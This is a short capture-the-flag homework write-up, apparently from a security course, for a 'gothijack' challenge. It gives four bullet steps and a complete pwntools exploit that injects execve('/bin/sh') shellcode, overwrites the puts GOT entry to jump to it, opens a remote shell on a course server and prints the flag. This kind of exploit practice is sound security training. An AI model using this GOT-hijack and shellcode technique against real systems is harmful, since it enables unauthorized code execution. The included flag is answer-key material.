# HW2
## gothijack
* NX disable.
* Hijack got value of puts.
* Jump to shellcode.
* Insert Null byte to bypass isalnum checking.
```python
#!/usr/bin/env python2
# -*- coding: ascii -*-
from pwn import *

# FLAG{G0THiJJack1NG}

context.arch = 'amd64'

e = ELF('./gothijack-2586ada3c6815e1ad4656d704ecfc03f86bc1b00')

host , port = 'csie.ctf.tw' , 10129

y = remote(host,port)

sc = 'H1\xf6H1\xd2H\xb8/bin/sh\x00PH\x89\xe7j;X\x0f\x05'

y.sendafter( ':' , '\x00' + sc )

y.sendafter( ':' , hex( e.got['puts'] ) )

y.sendafter( ':' , p64( 0x6010a0 + 1 ) )

sleep(1)

y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()
```